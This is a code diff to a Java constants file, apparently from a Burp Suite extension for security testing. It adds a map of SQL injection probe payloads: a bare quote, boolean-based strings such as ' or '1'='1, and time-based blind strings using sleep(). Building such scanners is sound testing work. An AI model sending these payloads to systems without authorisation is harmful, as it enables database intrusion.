@@ -1,5 +1,8 @@
 package burp.utils;
 
+import java.util.HashMap;
+import java.util.Map;
+
 public class Constants {
     static public String TREE_STATUS_EXPAND = "▼";
     static public String TREE_STATUS_COLLAPSE = "▶";
@@ -20,4 +23,13 @@ public class Constants {
             "'+and+sleep(10)%23",
             "+and+sleep(5)+-- "
     };
+
+    static public Map<String, String > payloadsMap  = new HashMap<String, String>(){{
+        put("1","");
+        put("2","'");
+        put("3","'+and+'1'='1");
+        put("4","'+or+'1'='1");
+        put("5","'+and+sleep(10)%23");
+        put("6","'+and+sleep(5)+-- ");
+    }};
 }
